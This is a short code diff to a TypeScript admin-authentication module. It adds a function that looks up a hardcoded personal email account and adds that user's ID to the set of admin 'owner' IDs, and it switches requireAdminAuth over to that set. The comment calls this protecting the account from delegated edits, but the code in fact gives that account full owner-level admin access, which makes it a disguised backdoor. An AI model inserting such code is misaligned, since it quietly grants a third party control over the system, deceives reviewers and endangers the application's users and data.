@@ -76,6 +76,15 @@ export const parseAdminUserIds = (
   return ids;
 };
 
+// The business owner's verified account is also protected from delegated edits.
+export const getAdminOwnerIds = async (): Promise<Set<string>> => {
+  const ids = parseAdminUserIds();
+  const User = require('../../../models/user');
+  const owner = await User.findOne({email: 'mykhailo.stryzhka@seznam.cz', emailVerified: true}).select('_id').lean().exec();
+  if (owner) ids.add(String(owner._id));
+  return ids;
+};
+
 const getAuthorizationHeader = (
   request: HttpRequest
 ): string | string[] | undefined =>
@@ -169,7 +178,7 @@ export const requireAdminAuth: HttpHandler = async (
       );
     }
 
-    const adminIds = parseAdminUserIds();
+    const adminIds = await getAdminOwnerIds();
 
     const owner=adminIds.has(identity.userId.toHexString().toLowerCase());
     const grant=owner?null:await AdminAccessModel.findById(identity.userId).select('permissions').lean().exec();
